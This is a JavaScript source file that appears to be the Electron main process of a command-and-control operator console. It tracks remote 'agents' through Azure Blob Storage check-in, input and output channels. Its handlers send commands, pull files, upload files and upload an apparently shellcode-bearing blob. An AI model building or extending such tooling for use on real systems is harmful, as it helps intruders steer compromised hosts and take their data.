const { app, BrowserWindow, ipcMain, Menu, clipboard, shell, dialog } = require('electron');
const fs   = require('fs');  
const path = require('path');
const az   = require('./azure');
const { getAppDataDir } = require('./common');
const directories = getAppDataDir();
global.config = require(directories.configFilePath);
const agents = [];
let metaContainer = config.metaContainer;
let win;
global.agentids           = [];
global.agentwindows       = 0;
global.agentWindowHandles = {}; // Store windows by agentID
global.dashboardWindow    = null;
global.agents             = [];

class Container 
{
  constructor(name, key = {}, blobs = {}) 
  {
    this.name = null || name;
    this.key = {} || key;
    this.blobs = {} || blobs;
  }

  setName(name) {
    this.name = name;
  }
  setKey(key) {
    this.key = {
      'key' : key.key,
      'iv' : key.iv
    };
  }
}

class Agent 
{
  constructor(agentId, containerObject) 
  {
    this.agentid   = null || agentId;
    this.container = null || containerObject;
    this.BrowserWindow = null;
  }

}

function createDashboardWindow() {
    global.dashboardWindow = new BrowserWindow({
        width: 1792,
        height: 1037,
        webPreferences: {
          contextIsolation: false,
          enableRemoteModule: true,
          nodeIntegration: true, // Enable Node.js integration in the renderer process
        },
    });
    global.dashboardWindow.loadFile('dashboard.html');
    console.log('Main window created');
}

async function createContainerWindow(thisagentid) {
    let exists = false;
    for (let i = 0; i < agents.length; i++) {
      if (agents[i].agentid === thisagentid)
      {
          console.log(`agent with agentid ${this_agent.agentid} already exists in agents[${i}]`);
          exists = true;
      }
    }
    if (!exists)
    {
        const containerWin = new BrowserWindow({
            width: 1592,
            height: 1037,
            webPreferences: {
              contextIsolation: false,
              enableRemoteModule: true,
              nodeIntegration: true, // Enable Node.js integration in the renderer process
            },
        });
        let thisAgent = global.agents.find(agent => agent.agentid === thisagentid);

        let containerObject   = new Container(thisAgent.container,thisAgent.aes,thisAgent.blobs); 
        let agent             = new Agent(thisAgent.agentid,containerObject); 
        agent.BrowserWindow   = containerWin;
        agents.push(agent);
        global.agentWindowHandles[thisAgent.agentid] = containerWin;

        agent.container.blobs['key']     = thisAgent.blobs['key'];
        agent.container.blobs['checkin'] = thisAgent.blobs['checkin'];
        agent.container.blobs['in']      = thisAgent.blobs['in'];
        agent.container.blobs['out']     = thisAgent.blobs['out'];
        for (const key in agent.container.blobs) {
            if (agent.container.blobs.hasOwnProperty(key)) {
                console.log(`${key}: ${agent.container.blobs[key]}`);
            }
        }
        agent.container.key['key'] = thisAgent.aes['key'];
        agent.container.key['iv']  = thisAgent.aes['iv'];

        let startupdata       = JSON.stringify(thisAgent);

        global.agentwindows++;
        containerWin.loadFile('agent-window.html').then(() => {
            containerWin.webContents.send('container-data', agent.container.name, agent.container.key, agent.container.blobs,startupdata);
        });
        console.log(`Container window created for container: ${thisAgent.container}`);
        console.log(`Number of agent windows : ${global.agentwindows}`);

        containerWin.on('close', async (event) => {
            event.preventDefault(); // Prevents default close
            await containerWin.webContents.send('window-closing'); // Notify renderer
        });

        ipcMain.on('force-close', async (event,agentid) => {
            // ipcMain.on('force-close', (event) => {
            console.log(`kernel.js : IPC force-close`);
            console.log(`agentid   : ${agentid}`);
            if(agents.length > 0){
                for (let i = 0; i < agents.length; i++) {
                  //console.log(`agents[${i}] : ${JSON.stringify(agents[i])}`);
                  if (agents[i].agentid === agentid)
                  {
                      agents.pop(agents[i]);
                      break;
                  }
                }
            }
            if (global.agentids.includes(agentid)) {
                console.log(`${agentid} removed from the array.`);
                global.agentids.pop(agentid);
            } 
            const agentWindow = global.agentWindowHandles[agentid];
            if (agentWindow) {
                agentWindow.destroy(); // Force close after confirmation
                delete global.agentWindowHandles[agentid]; // Remove from tracking
                global.agentwindows--;
            }
            console.log(`agentids        : ${global.agentids}`);
            console.log(`agents.length   : ${agents.length}`);
            console.log(`agentids.length : ${global.agentids.length}`);
            console.log(`agentwindows    : ${global.agentwindows}`);
        });
    }
}

async function createExplorerWindow(thisagent) {
    let this_agent = JSON.parse(thisagent);
    const ExplorerWin = new BrowserWindow({
        width: 1592,
        height: 1037,
        webPreferences: {
            contextIsolation: false,
            enableRemoteModule: true,
            nodeIntegration: true, 
        },
    });
    console.log(`Agent Data : ${JSON.stringify(this_agent)}`);
    const container_blobs = await az.getContainerBlobs(this_agent.containerid,config);
    console.log(`${this_agent.containerid} container key blob : ${container_blobs['key']}`);
    const container_key   = await az.getContainerAesKeys(this_agent.containerid,container_blobs['key'],config);
    let containerObject   = new Container(this_agent.containerid,container_key,container_blobs); 
    let agent             = new Agent(this_agent.agentid,containerObject); 

    agent.container.blobs['key']     = container_blobs['key'];
    agent.container.blobs['checkin'] = container_blobs['checkin'];
    agent.container.blobs['in']      = container_blobs['in'];
    agent.container.blobs['out']     = container_blobs['out'];
    for (const key in agent.container.blobs) {
        if (agent.container.blobs.hasOwnProperty(key)) {
            console.log(`${key}: ${agent.container.blobs[key]}`);
        }
    }
    agent.container.key['key'] = container_key['key'];
    agent.container.key['iv']  = container_key['iv'];

    let checkinData       = await az.checkinContainer(agent.container.name, agent.container.key, agent.container.blobs,config);
    let agentObj          = JSON.parse(checkinData);
    agentObj.agentid      = agent.agentid;
    agentObj.containerid  = agent.container.name;
    agentObj.key          = agent.container.key['key'];
    agentObj.iv           = agent.container.key['iv'];
    let startupdata       = JSON.stringify(agentObj);

    ExplorerWin.loadFile('explorer.html').then(() => {
            ExplorerWin.webContents.send('container-data', agent.container.name, agent.container.key, agent.container.blobs,startupdata);
    });
    ExplorerWin.on('close', async (event) => {
    });
}

// Open File Explorer at the Downloads Directory
function openDownloadsExplorer() {
    shell.openPath(directories.downloadsDir);
}

// Open File Explorer at the Downloads Directory
function openAgentLogsExplorer() {
    shell.openPath(directories.logDir);
}

// Function to Open Configuration Window
function openConfigWindow() {
    const configWindow = new BrowserWindow({
        width: 500,
        height: 400,
        title: "Configuration",
        parent: win,
        modal: true,
        webPreferences: {
            contextIsolation: false,
            enableRemoteModule: true,
            nodeIntegration: true, // Allow Node.js access in the settings window
        },
    });
    configWindow.loadFile('settings.html');
}

ipcMain.handle('updateagent', async (event, agentid,newcontainerid) => {
    try
    {
        const newcontainer_blobs = await az.getContainerBlobs(newcontainerid,config);
        console.log(`${newcontainerid} container key blob : ${newcontainer_blobs['key']}`);
        const container_key      = await az.getContainerAesKeys(newcontainerid,newcontainer_blobs['key'],config);
        let checkinData          = await az.checkinContainer(newcontainerid, container_key,newcontainer_blobs,config);
        let agentObj             = JSON.parse(checkinData);
        agentObj.agentid         = agentid;
        agentObj.containerid     = newcontainerid;
        agentObj.key             = container_key['key'];
        agentObj.iv              = container_key['iv'];
        let startupdata          = JSON.stringify(agentObj);

        for (let i = 0; i < agents.length; i++) {
            if (agents[i].agentid === agentid)
            {
                JSON.stringify(agents[i]);
                // agents[i].window.setCheckin(agent.window.checkin);
                agents[i].container.name = newcontainerid;
                agents[i].BrowserWindow.webContents.send('container-data', newcontainerid, container_key, newcontainer_blobs,startupdata);
                break;
            }
        }
    }catch(error)
    {
        console.log(`updateagent IPC kernel.js error : ${error} ${error.stack}`);
    }
});

ipcMain.on('upload-client-command-to-input-channel', async (event, containerCmd) => {
    try {
        console.log(`Received IPC "upload-client-command-to-input-channel" with args: ${containerCmd}`);
        
        let commandOutput = await az.uploadCommand(containerCmd, config);
        console.log(`Command output: ${commandOutput}`);

        // Send the result back to the **calling renderer process** directly
        event.reply('command-output', commandOutput);
    } catch (error) {
        console.error('Error uploading command to Azure Blob Storage:', error);
        event.reply('command-output', `Error: ${error.message}`); // Send error response
    }
});

ipcMain.on('pull-download-file', async (event, containerCmd, filename, blob) => {
    try {
        console.log(`[+] IpcMain pull-download-file`);
        console.log(`[+] config ${JSON.stringify(config)}`);
        if (filename.startsWith("'") && filename.endsWith("'")) {
            filename = filename.slice(1, -1);
        }
        if (filename.startsWith('"') && filename.endsWith('"')) {
            filename = filename.slice(1, -1);
        }
      let containerCommand = JSON.parse(containerCmd);
      let commandOutput    = await az.pullDownloadFile(containerCmd,filename,blob,config);
      console.log(`kernel.js | after az.pullDownloadFile`);
    } catch (error) {
      console.error('Error uploading command to Azure Blob Storage:', error);
    }
});

ipcMain.on('upload-file-to-blob', async (event, containerCmd, uploadfile, uploadblob) => {
    try {
      let containerCommand = JSON.parse(containerCmd);
      let commandOutput    = await az.uploadFileToAzure(containerCmd, uploadblob, uploadfile,config);
      for (let i = 0; i < agents.length; i++) {
          if (agents[i].container.blobs['in'] === containerCommand.blobs['in'])
          {
              await agents[i].BrowserWindow.webContents.send('send-upload-command', containerCmd);
          }
      }
    } catch (error) {
        console.error('Error uploading command to Azure Blob Storage:', error);
    }
});

ipcMain.on('upload-sc-to-blob', async (event, containerCmd, scfile, scblob) => {
    try {
        let containerCommand = JSON.parse(containerCmd);
        await az.uploadSCToAzure(containerCmd, scblob, scfile,config);
        for (let i = 0; i < agents.length; i++) {
            if (agents[i].container.blobs['in'] === containerCommand.blobs['in'])
            {
                await agents[i].BrowserWindow.webContents.send('send-upload-command', containerCmd);
            }
        }
    } catch (error) {
        console.error('Error uploading command to Azure Blob Storage:', error);
    }
});

// Fetch container data and send it to the renderer process
ipcMain.handle('preload-agents', async () => {
    let blobs = await az.preloadContainers(metaContainer,config);
    return blobs;
});

// Fetch container data and send it to the renderer process
ipcMain.handle('get-containers', async () => {
    let blobs = await az.updateDashboardTable(metaContainer,config);
    //console.log(`IPC get-containers : agent checkin blobs : ${blobs}`);
    return blobs;
});

ipcMain.handle('get-agent-checkin', async (event, agentid) => {
    let thisAgent = global.agents.find(agent => agent.agentid === agentid); 
    let agentCheckin = await az.returnAgentCheckinInfo(thisAgent.container,thisAgent.blobs['in']);
    thisAgent.checkin = agentCheckin;
    return JSON.stringify(thisAgent);
});

ipcMain.on('open-container-window', async (event, thisagentid) => {
    console.log(`IPC Open Container Window : ${thisagentid}`);

    // let this_agent = JSON.parse(thisagent);
    let window_exists = false;
    if (global.agentwindows === 0)
    {
        global.agentids.length = 0;
    }

    console.log(`agentids[] : ${thisagentid}`);
    if (!global.agentids.includes(thisagentid)) {
      global.agentids.push(thisagentid);
        console.log(`${thisagentid} added to the array.`);
    } else {
        console.log(`${thisagentid} already exists.`);
        window_exists = true;
    }
    const agentWindow = global.agentWindowHandles[thisagentid];
    if (global.agentWindowHandles[thisagentid] !== undefined) 
    {
        window_exists = true;
        console.log(`window exists`);
        // Check if window for this agent already exists
        if (agentWindow && !agentWindow.isDestroyed()) {
            agentWindow.focus(); // Bring existing window to front
            return;
        }
    }
    // }
    if (window_exists == false)
    {
        setTimeout(() => { createContainerWindow(thisagentid) }, 1000); // Simulate some delay before closing
    }
});

ipcMain.on('execute-command', (event, command) => {
    console.log(`Executing command: ${command}`);
    // Execute the command here and send the result back to the console window
    const result = `Executed command: ${command}`;
    event.sender.send('command-result', result);
});

app.whenReady().then(() => {
    console.log('App is ready');
    createDashboardWindow();
    // Create Application Menu
    const menu = Menu.buildFromTemplate([
      {
          label: 'View',
          submenu: [
              {
                  label: 'Configuration',
                  click: () => {
                      openConfigWindow();
                  }
              },
              {
                  label: 'Downloads',
                  click: () => {
                      openDownloadsExplorer();
                  }
              },
              {
                  label: 'Agent Logs',
                  click: () => {
                      openAgentLogsExplorer();
                  }
              }
          ]
      },
      {
          label: 'Developer',
          submenu: [
              {
                  label: 'Toggle Developer Tools',
                  accelerator: 'CmdOrCtrl+Shift+I',
                  click: () => {
                      const focusedWindow = BrowserWindow.getFocusedWindow();
                      if (focusedWindow) {
                          focusedWindow.webContents.toggleDevTools();
                      }
                  }
              },
              {
                  role: 'reload'
              }
          ]
      }
  ]);
Menu.setApplicationMenu(menu);
// Handle right-click context menu for table rows
ipcMain.on('show-row-context-menu', (event, agentDataJSON) => {
        let agentData = JSON.parse(agentDataJSON);
        const agentid = agentData.agentid;
        const contextMenu = Menu.buildFromTemplate([
                {
                        label: 'Remove',
                        click: async () => {
                                console.log(`IPC show-row-context-menu : AgentData : ${agentDataJSON}`);
                                //console.log(`config : ${JSON.stringify(config)}`);
                                //console.log(`agents.length = ${agents.length}`);
                                // Send event to dashboard window to remove the table row
                                const dashboardWindow = win;
                                if (global.agentWindowHandles[agentid]) {
                                        console.log(`Closing window for agent ID: ${agentid}`);
                                        global.agentWindowHandles[agentid].destroy();
                                        delete global.agentWindowHandles[agentid]; // Remove reference to the closed window
                                        for (let i = 0; i < agents.length; i++) {
                                                if (agents[i].agentid === agentid)
                                                {
                                                        console.log(`Before pop : global.agentids[] : ${global.agentids}`);
                                                        agents.pop(agents[i]);
                                                        global.agentids.pop(agentid);
                                                        console.log(`After pop  : global.agentids[] : ${global.agentids}`);
                                                }
                                        }
                                        global.agentwindows--;
                                }
                                if (dashboardWindow) {
                                        console.log(`dashboardWindow exists`);
                                        console.log(`calling IPC remove-table row for ${agentid} agent`);
                                        dashboardWindow.webContents.send('remove-table-row', agentid);
                                }
                                let container_blobs = await az.getContainerBlobs(agentData.containerid,config);
                                //console.log(`container_blobs : ${JSON.stringify(container_blobs)}`);
                                let container_key   = await az.getContainerAesKeys(agentData.containerid,container_blobs['key'],config);
                                //console.log(`container_key : ${JSON.stringify(container_key)}`);
                                if (container_blobs != false && container_key)
                                {
                                        try
                                        {
                                                    await az.DeleteStorageContainer( agentData.containerid, config );
                                                    await az.DeleteStorageBlob( config.metaContainer, agentData.agentid, config );
                                                    //console.log(`agents : ${JSON.stringify(agents)}`);
                                                    if (dashboardWindow) {
                                                            console.log(`dashboardWindow exists`);
                                                            console.log(`calling IPC remove-table row for ${agentid} agent`);
                                                            dashboardWindow.webContents.send('remove-table-row', agentid);
                                                    }
                                        }catch(error)
                                        {
                                                    console.log(`Remove error : ${error} ${error.stack}`);
                                        }
                                }
                        }
                },
                {
                        label: 'Explorer',
                        click: () => {
                                console.log(`Explorer clicked for agent ID: ${agentid}`);
                                createExplorerWindow(agentDataJSON);
                                // Implement the logic for Explorer option here
                        }
                }
        ]);
      contextMenu.popup(BrowserWindow.fromWebContents(event.sender));
    });
      // Right-click Context Menu
      ipcMain.on('show-context-menu', (event) => {
          const contextMenu = Menu.buildFromTemplate([
              { label: 'Undo', role: 'undo' },
              { label: 'Redo', role: 'redo' },
              { type: 'separator' },
              { label: 'Cut', role: 'cut' },
              { label: 'Copy', role: 'copy' },
              { label: 'Paste', role: 'paste' },
              { type: 'separator' },
              { label: 'Select All', role: 'selectAll' }
          ]);
          contextMenu.popup(BrowserWindow.fromWebContents(event.sender));
    });

    // Fix for macOS Clipboard Shortcuts
    ipcMain.on('copy', async (event) => {
        const focusedWindow = BrowserWindow.getFocusedWindow();
        if (focusedWindow) {
            const selectedText = await focusedWindow.webContents.executeJavaScript('window.getSelection().toString()');
            clipboard.writeText(selectedText);
        }
    });

    ipcMain.on('cut', async (event) => {
        const focusedWindow = BrowserWindow.getFocusedWindow();
        if (focusedWindow) {
            const selectedText = await focusedWindow.webContents.executeJavaScript('window.getSelection().toString()');
            clipboard.writeText(selectedText);
            focusedWindow.webContents.executeJavaScript('document.execCommand("cut")');
        }
    });

    ipcMain.on('paste', (event) => {
        const focusedWindow = BrowserWindow.getFocusedWindow();
        if (focusedWindow) {
            focusedWindow.webContents.paste();
        }
    });

    ipcMain.on('update-config', (event, newConfig) => {
        //const configPath = path.join(__dirname, 'config.js');
        const configPath = directories.configFilePath;
        fs.writeFileSync(configPath, `module.exports = ${JSON.stringify(newConfig, null, 4)};`);
        console.log("Configuration updated:", newConfig);
        config        = newConfig;
        metaContainer = config.metaContainer;
    });
});

app.on('window-all-closed', () => {
    app.quit();
});

app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) {
        createDashboardWindow();
    }
});